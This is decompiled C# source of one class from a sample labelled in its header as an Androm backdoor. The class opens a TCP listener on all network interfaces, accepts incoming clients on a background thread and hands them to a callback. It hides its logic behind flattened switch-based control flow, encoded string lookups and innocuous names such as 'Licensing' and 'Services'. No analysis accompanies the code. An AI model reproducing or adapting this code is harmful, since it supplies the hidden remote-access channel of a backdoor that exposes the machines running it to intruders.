// Decompiled with JetBrains decompiler
// Type: TGL.Services.Context
// Assembly: InvalidOleVariantTypeExcept, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9E82E8E9-C8CD-41F7-BA61-2A9379AE4148
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Androm.gen-02b77b24d467552510c0f56dbde53c82e4e932dcaeb0e08fcfec00d4c359a9b9.exe

using InvalidOleVariantTypeExcept.Filters;
using InvalidOleVariantTypeExcept.Watchers;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using TGL.Consumers;
using TGL.Licensing;

namespace TGL.Services
{
  public class Context : DicComparatorConsumer
  {
    private int _Stub;
    private Thread _Publisher;
    private TcpListener _Schema;
    private CancellationTokenSource _Prototype;
    private readonly object _Value;
    public Context.PrototypePublisherService m_Map;
    public Context.TagStubPolicy reg;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InsertRecord(int value, bool removecol = true)
    {
      this._Stub = value;
      try
      {
        lock (this._Value)
        {
          int num1 = 9;
          while (true)
          {
            int num2 = num1;
            while (true)
            {
              switch (num2)
              {
                case 0:
                  this._Prototype = new CancellationTokenSource();
                  goto case 5;
                case 1:
                case 6:
                  goto label_4;
                case 2:
                  goto label_13;
                case 3:
                  goto label_16;
                case 4:
                  goto label_15;
                case 5:
                  this._Publisher = new Thread((ThreadStart) (() => this.NewRecord(this._Prototype.Token)))
                  {
                    IsBackground = removecol
                  };
                  num2 = 4;
                  continue;
                case 7:
                  goto label_24;
                case 8:
                  this._Publisher.Start();
                  if (Context.UpdateInfo())
                  {
                    num2 = 2;
                    continue;
                  }
                  goto label_4;
                case 9:
                  goto label_17;
                case 10:
                  goto label_19;
                default:
                  num2 = 5;
                  continue;
              }
            }
label_4:
            int num3 = !this._Publisher.IsAlive ? 1 : 0;
label_6:
            if (num3 != 0)
            {
              num1 = 3;
              continue;
            }
            this.log((BehaviorAccumulateValues) 1, RoleValueFilter.RestartVisitor(74));
            num1 = 10;
            continue;
label_15:
            this._Schema.Start();
            num1 = 8;
            continue;
label_16:
            this._Schema = new TcpListener(IPAddress.Any, value);
            num1 = 0;
            continue;
label_17:
            if (this._Publisher == null)
            {
              num3 = 1;
              goto label_6;
            }
            else
              num1 = 6;
          }
label_13:
          return;
label_24:
          return;
label_19:;
        }
      }
      catch (Exception ex)
      {
        this.log((BehaviorAccumulateValues) 2, RoleValueFilter.RestartVisitor(172));
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void FindRecord()
    {
      try
      {
        if (this._Schema == null || this._Publisher == null || !this._Publisher.IsAlive)
          return;
        lock (this._Value)
        {
          int num1 = 2;
          if (true)
            goto label_7;
label_4:
          this.log((BehaviorAccumulateValues) 0, RoleValueFilter.RestartVisitor(248));
          int num2 = 5;
label_6:
          num1 = num2;
label_7:
          switch (num1)
          {
            case 0:
            case 2:
              this._Prototype.Cancel();
              num2 = 4;
              goto label_6;
            case 1:
            case 4:
              this._Schema.Stop();
              goto label_4;
            case 3:
              goto label_4;
            case 5:
              break;
            default:
              num2 = 3;
              goto label_6;
          }
        }
      }
      catch (Exception ex)
      {
        this.log((BehaviorAccumulateValues) 2, RoleValueFilter.RestartVisitor(266));
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void NewRecord(CancellationToken v)
    {
      int num1 = 2;
      while (true)
      {
        int num2;
        bool flag;
        switch (num1)
        {
          case 0:
          case 2:
            this.log((BehaviorAccumulateValues) 0, RoleValueFilter.RestartVisitor(286));
            num2 = 3;
            break;
          case 1:
          case 3:
            flag = !v.IsCancellationRequested;
            goto case 4;
          case 4:
            if (flag)
            {
              try
              {
                this.reg(this._Schema.AcceptTcpClient());
              }
              catch (Exception ex)
              {
                if (!v.IsCancellationRequested)
                  this.FindRecord();
              }
              goto case 1;
            }
            else
            {
              num2 = 5;
              break;
            }
          case 5:
            goto label_5;
          default:
            num1 = 4;
            continue;
        }
        num1 = num2;
      }
label_5:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool OrderRecord() => this._Prototype != null && !this._Prototype.IsCancellationRequested;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void log(BehaviorAccumulateValues task, string cust) => this.m_Map(new KeyValuePair<BehaviorAccumulateValues, string>(task, RoleValueFilter.RestartVisitor(304) + this._Stub.ToString() + RoleValueFilter.RestartVisitor(322) + cust));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Context()
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              UtilsContextLicense.ListWorker();
              num2 = 2;
              continue;
            case 1:
            case 2:
              this._Value = new object();
              goto case 3;
            case 3:
              // ISSUE: explicit constructor call
              base.\u002Ector();
              num2 = 5;
              continue;
            case 5:
              goto label_7;
            default:
              goto label_4;
          }
        }
label_4:
        num1 = 3;
      }
label_7:;
    }

    internal static bool UpdateInfo() => true;

    internal static bool InitInfo() => false;

    public delegate void PrototypePublisherService(
      KeyValuePair<BehaviorAccumulateValues, string> msg);

    public delegate void TagStubPolicy(TcpClient client);
  }
}
